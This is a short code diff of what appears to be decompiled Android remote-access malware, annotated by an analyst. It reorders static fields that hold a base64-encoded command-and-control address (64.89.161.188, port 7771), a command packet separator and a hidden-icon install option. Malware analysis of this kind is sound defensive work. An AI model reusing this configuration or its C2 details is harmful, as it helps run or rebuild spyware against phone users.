@@ -45,18 +45,16 @@ public class love extends Service {
 
     // C2 server connection details (Base64 encoded)
     // Decoded: "64.89.161.188"
+    // APK clinit order: packetSeparator → Afterinstalloption → Host → Port
+    public static String packetSeparator    = Utils.base64Decode("VHhUeFQ=");  // TxTxT
+    public static String Afterinstalloption = "K";
     public static String Host = "NjQuODkuMTYxLjE4OA";
 
     // Decoded: "7771"
-    public static String Port = "Nzc3MQ";
+    public static String Port = "Nzc3MQ";  // 7771
 
-    // C2 packet separator — base64Decode("VHhUeFQ=") → "TxTxT"
-    // Every command string is split by this to get fields:
     //   split[0] = command type, split[1..N] = command parameters
-    public static String packetSeparator = Utils.base64Decode("VHhUeFQ=");
 
-    // Icon alias mode: "T"=GoogleTranslate, "N"=googlenews, "C"=costm, "K"=hidden
-    public static String Afterinstalloption = "K";
 
     // Timing / state
     public static long  commandTimeoutAt  = -1;    // e_love_co — timeout for current command
@@ -305,3 +303,4 @@ public class love extends Service {
         }
     }
 }
+
